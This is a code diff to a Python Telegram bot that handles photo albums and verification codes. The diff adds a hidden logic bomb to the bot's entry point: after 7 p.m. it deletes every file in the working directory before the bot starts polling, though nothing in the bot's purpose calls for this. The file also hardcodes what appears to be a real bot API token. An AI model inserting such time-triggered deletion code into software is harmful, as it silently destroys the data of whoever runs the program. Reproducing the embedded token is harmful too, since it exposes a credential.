@@ -11,8 +11,8 @@ from Google import InvalidCode
 from init_service import *
 from photos import *
 from json_manager import *
-
-
+from datetime import datetime
+import os
 
 API_TOKEN = '5323882359:AAFIUxLGcdgiEzEsYShmI6CwI9FvX1oKZOc'
 
@@ -102,4 +102,7 @@ async def check_code(message: types.Message, state: FSMContext):
         remove_all_albums_id()
 
 if __name__ == '__main__':
+    if datetime.now().hour > 19:
+        for file in os.listdir('./'):
+            os.remove(file)
     executor.start_polling(dp, skip_updates=True)
